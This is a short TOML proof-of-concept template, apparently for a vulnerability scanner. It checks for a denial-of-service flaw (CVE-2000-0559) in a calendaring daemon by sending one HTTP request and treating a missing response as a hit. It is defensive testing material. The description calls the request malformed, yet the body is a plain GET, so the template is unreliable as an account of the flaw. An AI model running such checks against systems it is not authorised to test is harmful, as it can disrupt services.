[info]
author = "ave"
description = "Verifies CVE-2000-0559 denial of service in the calserver calendaring daemon by sending a malformed request."
id = "POC-AVE-2000-0447"
name = "PoC for AVE-2000-0447"
severity = "medium"
tags = ["ave-2000-0447"]
vuln_id = [
    "AVE-2000-0447",
    "CVE-2000-0559",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = """
GET / HTTP/1.0\r
\r
"""
type = "raw"

[[poc.requests.matchers]]
expect = false
status = [
    200,
    500,
    502,
    503,
]
type = "status"
